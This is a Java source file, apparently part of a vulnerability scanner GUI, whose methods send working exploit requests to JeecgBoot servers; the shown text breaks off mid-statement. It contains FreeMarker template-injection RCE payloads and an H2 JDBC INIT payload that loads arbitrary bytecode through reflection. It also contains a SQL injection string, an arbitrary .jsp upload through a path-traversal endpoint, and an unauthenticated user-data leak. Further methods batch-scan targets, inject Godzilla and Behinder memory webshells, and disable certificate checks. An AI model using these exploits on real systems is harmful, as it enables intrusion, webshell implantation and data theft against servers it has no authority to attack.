package com.security.scanner.service;

import com.security.scanner.utils.NetworkUtils;
import com.security.scanner.utils.FileUtils;
import javafx.scene.control.TextArea;
import net.sf.json.JSONArray;
import net.sf.json.JSONObject;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.List;
import java.util.Random;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import com.security.scanner.vulnerabilities.MemshellVulnerabilities;
import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.SSLSessionContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.security.cert.X509Certificate;

public class VulnerabilityScannerService {

    private NetworkUtils networkUtils;
    


    public VulnerabilityScannerService() {
        this.networkUtils = new NetworkUtils();
    }

    // 指纹识别
    public void zhiwen(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url);
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            int responseCode = connection.getResponseCode();
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            Pattern pattern = Pattern.compile("window._CONFIG\\['domianURL'\\] = \\'(.*?);");
            Matcher matcher = pattern.matcher(response);
            if (matcher.find()) {
                String value = matcher.group(1);
                output.appendText("\n抓取到接口:" + value + "\n");
            }
        } catch (Exception e) {
            // 静默处理异常
        }
    }

    // RCE漏洞检测
    public void jeecgrce(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(url + "/jeecg-boot/jmreport/queryFieldBySql");
            String json = "{\"sql\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"echo 86756755\\\") }' \"}";

            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");

            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
            writer.write(json);
            writer.close();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("86756755")) {
                output.appendText(formattedDateTime + url + "[+]可能存在jeect-boot queryFieldBySql远程命令执行漏洞 poc1\n");
                output.appendText(url + "/jeecg-boot/jmreport/queryFieldBySql\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞- poc1\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞- poc1\n");
        }
    }

    public void jeecgrce1(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(url + "/jmreport/queryFieldBySql");
            String json = "{\"sql\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"echo 86756755\\\") }' \"}";

            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");

            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStreamWriter writer = new OutputStreamWriter(connection.getOutputStream());
            writer.write(json);
            writer.close();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("86756755")) {
                output.appendText(formattedDateTime + url + "[+]可能存在jeect-boot queryFieldBySql远程命令执行漏洞 poc2\n");
                output.appendText(url + "/jmreport/queryFieldBySql\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞- poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "[-]不存在jeect-boot queryFieldBySql远程命令执行漏洞- poc2\n");
        }
    }

    // TestConnection漏洞检测
    public void jeecgtest(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            if (!isValidUrl(url)) {
                output.appendText("输入的不是有效的网址\n");
                return;
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(url + "/jeecg-boot/jmreport/testConnection");

            // 这里包含了一个很长的Base64编码的payload，实际使用时需要简化
            String json = "{\"id\":\"1\",\"code\":\"ABC\",\"dbType\":\"MySQL\",\"dbDriver\":\"org.h2.Driver\",\"dbUrl\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\\\;}catch (Exception e){e.printStackTrace()\\\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\\\\\"defineClass\\\\\\\", byte[].class,int.class,int.class)\\\\;defineClassMethod.setAccessible(true)\\\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\\\;clz.newInstance()\\\\;}'\\\\;CALL EXEC('test')\",\"dbName\":\"383BAb7deFC825E6\",\"dbPassword\":\"917982\",\"userName\":\"917982\"}";

            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("cmd", "echo 7868765756767");

            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("7868765756767")) {
                output.appendText(formattedDateTime + url + "[+++]可能存在jeect-boot testConnection远程命令执行漏洞 poc1\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeect-boot testConnection远程命令执行漏洞 poc1\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "[-]不存在jeect-boot testConnection远程命令执行漏洞- poc1\n");
        }
    }

    public void jeecgtest1(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(url + "/jmreport/testConnection");

            // 使用不同的payload
            String json = "{\"id\":\"1\",\"code\":\"ABC\",\"dbType\":\"MySQL\",\"dbDriver\":\"org.h2.Driver\",\"dbUrl\":\"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes\\\\;try{bytes=java.util.Base64.getDecoder().decode(b)\\\\;}catch (Exception e){e.printStackTrace()\\\\;bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b)\\\\;}java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\\\\\\\"defineClass\\\\\\\", byte[].class,int.class,int.class)\\\\;defineClassMethod.setAccessible(true)\\\\;Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0],java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0,bytes.length)\\\\;clz.newInstance()\\\\;}'\\\\;CALL EXEC('test')\",\"dbName\":\"383BAb7deFC825E6\",\"dbPassword\":\"917982\",\"userName\":\"917982\"}";

            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("cmd", "echo 87685675765");

            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("87685675765")) {
                output.appendText(formattedDateTime + url + "[+++]存在jeect-boot testConnection远程命令执行漏洞 poc2\n");
                output.appendText(url + "/jmreport/testConnection\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeect-boot testConnection远程命令执行漏洞 poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "[-]不存在jeect-boot testConnection远程命令执行漏洞- poc2\n");
        }
    }

    // SSTI模板注入漏洞检测
    public void jeecgrcedfs(String url, String payload, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            OkHttpClient client = new NetworkUtils().createOkHttpClient();
            RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), payload);
            Request request = new Request.Builder()
                    .url(url + "/jeecg-boot/jmreport/loadTableData")
                    .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    .post(requestBody)
                    .build();

            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();

            if (responseBody.contains("888888")) {
                output.appendText(formattedDateTime + url + "[+++]存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞 poc1\n");
                output.appendText(url + "/jeecg-boot/jmreport/loadTableData\n");
                output.appendText(response.toString());
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞 poc1\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞- poc1\n");
        }
    }

    public void jeecgdfs1(String url, String payload, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jmreport/loadTableData");
            String json = "{\"dbSource\":\"\",\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\"echo 888888\\\")}'\",\"tableName\":\"test_demo);\",\"pageNo\":1,\"pageSize\":10}";

            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");

            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("888888")) {
                output.appendText(formattedDateTime + url + "[+++]存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞 poc2\n");
                output.appendText(url + "/jmreport/loadTableData\n");
                output.appendText(response.toString());
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞 poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞- poc2\n");
        }
    }

    // SQL注入漏洞检测
    public void jeecgdsd(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            String params = "{\"apiSelectId\":\"1316997232402231298\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '\"}";

            OkHttpClient client = new NetworkUtils().createOkHttpClient();
            RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), params);
            Request request = new Request.Builder()
                    .url(url + "/jeecg-boot/jmreport/qurestSql")
                    .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    .post(requestBody)
                    .build();

            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();

            if (responseBody.contains("e10adc3949ba59abbe56e057f20f883e")) {
                output.appendText(formattedDateTime + url + "[+++]存在jeecg-boot-queryTableData-sqli注入漏洞 poc1\n");
                output.appendText(url + "/jeecg-boot/jmreport/qurestSql\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-queryTableData-sqli注入漏洞 poc1\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-queryTableData-sqli注入漏洞-poc1\n");
        }
    }

    public void jeecgdsd1(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            String params = "{\"apiSelectId\":\"1316997232402231298\",\"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select md5(123456))),1)) or '%%' like '\"}";

            OkHttpClient client = new NetworkUtils().createOkHttpClient();
            RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), params);
            Request request = new Request.Builder()
                    .url(url + "/jmreport/qurestSql")
                    .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                    .post(requestBody)
                    .build();

            Response response = client.newCall(request).execute();
            String responseBody = response.body().string();

            if (responseBody.contains("e10adc3949ba59abbe56e057f20f883e")) {
                output.appendText(formattedDateTime + url + "[+++]存在jeecg-boot-queryTableData-sqli注入漏洞 poc2\n");
                output.appendText(url + "/jmreport/qurestSql\n");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-queryTableData-sqli注入漏洞 poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-queryTableData-sqli注入漏洞-poc2\n");
        }
    }

    // 文件上传漏洞检测
    public void jeecggetshell(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(url + "/api/../commonController.do?parserXml");

            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=----WebKitFormBoundaryyfyhSCMs9cajzFD4");
            connection.setRequestProperty("Accept-Encoding", "gzip, deflate");

            String boundary = "----WebKitFormBoundaryyfyhSCMs9cajzFD4";
            StringBuilder requestBody = new StringBuilder();
            requestBody.append("--").append(boundary).append("\r\n");
            requestBody.append("Content-Disposition: form-data; name=\"name\"\r\n");
            requestBody.append("\r\n");
            requestBody.append("qwe.png").append("\r\n");
            requestBody.append("--").append(boundary).append("\r\n");
            requestBody.append("Content-Disposition: form-data; name=\"documentTitle\"\r\n");
            requestBody.append("\r\n");
            requestBody.append("blank").append("\r\n");
            requestBody.append("--").append(boundary).append("\r\n");
            requestBody.append("Content-Disposition: form-data; name=\"file\"; filename=\"qwer.jsp\"\r\n");
            requestBody.append("Content-Type: image/png\r\n");
            requestBody.append("\r\n");
            requestBody.append("<% out.println(\"hello,jeecg\");%>").append("\r\n");
            requestBody.append("--").append(boundary).append("--").append("\r\n");

            byte[] requestData = requestBody.toString().getBytes("UTF-8");
            connection.setRequestProperty("Content-Length", String.valueOf(requestData.length));
            OutputStream outputStream = connection.getOutputStream();
            outputStream.write(requestData);
            outputStream.flush();
            outputStream.close();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            String age = jsonObject.getString("msg");

            if (age.equals("操作成功")) {
                output.appendText(formattedDateTime + url + "[+++]存在jeecg-boot commonController 任意文件上传漏洞\n");
                output.appendText(url + "/qwer.jsp");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot commonController 任意文件上传漏洞\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot commonController 任意文件上传漏洞-\n");
        }
    }

    // 信息泄露漏洞检测
    public void jeecguser(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/jeecg-boot/sys/user/querySysUser?username=admin");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            int age = jsonObject.optInt("code");

            if (age == 0) {
                output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-querySysUser信息泄露漏洞 poc1\n");
                output.appendText(formattedDateTime + url + "/jeecg-boot/sys/user/querySysUser?username=admin");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-querySysUser信息泄露漏洞 poc1\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-querySysUser信息泄露漏洞-poc1");
        }
    }

    public void jeecguser1(String url, TextArea output) {
        try {
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(url + "/sys/user/querySysUser?username=admin");
            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            String jsonStr = response.toString();
            JSONObject jsonObject = JSONObject.fromObject(jsonStr);
            int age = jsonObject.optInt("code");

            if (age == 0) {
                output.appendText(formattedDateTime + url + "[+]存在jeecg-boot-querySysUser信息泄露漏洞 poc2\n");
                output.appendText(formattedDateTime + url + "/sys/user/querySysUser?username=admin");
            } else {
                output.appendText(formattedDateTime + url + "[-]不存在jeecg-boot-querySysUser信息泄露漏洞 poc2\n");
            }
        } catch (Exception e) {
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            output.appendText(formattedDateTime + "[-]不存在jeecg-boot-querySysUser信息泄露漏洞-poc2");
        }
    }

    // 批量扫描方法
    public void pl(String line, TextArea output) {
        try {
            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(line + "/jeecg-boot/jmreport/queryFieldBySql");
            String json = "{\"sql\":\"select '<#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()> ${ ex(\\\"echo 86756755\\\") }' \"}";

            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");

            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("86756755")) {
                output.appendText(formattedDateTime + line + "[+]可能存在jeect-boot queryFieldBySql远程命令执行漏洞\n");
            }
        } catch (Exception e) {
            // 静默处理异常
        }
    }

    public void ssi(String line, TextArea output) {
        try {
            NetworkUtils.configureSSL();
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);

            URL url1 = new URL(line + "/jeecg-boot/jmreport/loadTableData");
            String json = "{\"dbSource\":\"\",\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\"echo 888888\\\")}'\",\"tableName\":\"test_demo);\",\"pageNo\":1,\"pageSize\":10}";

            HttpURLConnection connection = (HttpURLConnection) url1.openConnection();
            connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json");

            byte[] input = json.getBytes(StandardCharsets.UTF_8);
            OutputStream os = connection.getOutputStream();
            os.write(input, 0, input.length);
            os.flush();

            BufferedReader br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            StringBuffer response = new StringBuffer();
            response.append(br.readLine());

            String inputLine;
            while ((inputLine = br.readLine()) != null) {
                response.append(inputLine);
            }

            if (response.toString().contains("888888")) {
                output.appendText(formattedDateTime + line + "[+++]存在JeecgBoot jmreport/loadTableData SSTI模板注入漏洞\n");
                output.appendText(response.toString());
            }
        } catch (Exception e) {
            // 静默处理异常
        }
    }

    // 其他方法的占位符实现
    public void jeecgzhuruds(String url, TextArea output) {
        // 在后台线程中执行，避免阻塞UI
        new Thread(() -> {
            try {
                MemshellVulnerabilities memshell = new MemshellVulnerabilities(url, "");
                memshell.jeecgzhuruds();
                // 在UI线程中更新内存马模块的文本框
                javafx.application.Platform.runLater(() -> {
                    output.appendText(memshell.getTestfdg());
                });
            } catch (Exception e) {
                javafx.application.Platform.runLater(() -> {
                    output.appendText("哥斯拉注入执行出错: " + e.getMessage() + "\n");
                });
            }
        }).start();
    }

    public void jeecgzhudb(String url, TextArea output) {
        // 在后台线程中执行，避免阻塞UI
        new Thread(() -> {
            try {
                MemshellVulnerabilities memshell = new MemshellVulnerabilities(url, "");
                memshell.jeecgzhudb();
                // 在UI线程中更新内存马模块的文本框
                javafx.application.Platform.runLater(() -> {
                    output.appendText(memshell.getTestfdg());
                });
            } catch (Exception e) {
                javafx.application.Platform.runLater(() -> {
                    output.appendText("冰蝎注入执行出错: " + e.getMessage() + "\n");
                });
            }
        }).start();
    }

    public void jeecggskkl(String url, TextArea output) {
        if (url.endsWith("/")) {
            url = url.substring(0, url.length() - 1);
        }

        try {
            HostnameVerifier hv = new HostnameVerifier() {
                public boolean verify(String urlHostName, SSLSession session) {
                    return true;
                }
            };
            TrustManager[] trustAllCerts = new TrustManager[]{new TrustAllTrustManager()};
            SSLContext sc = SSLContext.getInstance("SSL");
            SSLSessionContext sslsc = sc.getServerSessionContext();
            sslsc.setSessionTimeout(0);
            sc.init(null, trustAllCerts, null);
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HttpsURLConnection.setDefaultHostnameVerifier(hv);
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
            String formattedDateTime = now.format(formatter);
            Random random = new Random();
            int randomNumber = random.nextInt(100);
            URL url1 = new URL(url + "/api/../commonController.do?parserXml");
            HttpURLConnection connection = (HttpURLConnection)url1.openConnection();
            connection.setRequestProperty(
                    "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 Hutool"
            );
            connection.setDoOutput(true);
            connection.setRequestMethod("POST");
            connection.setRequestProperty(
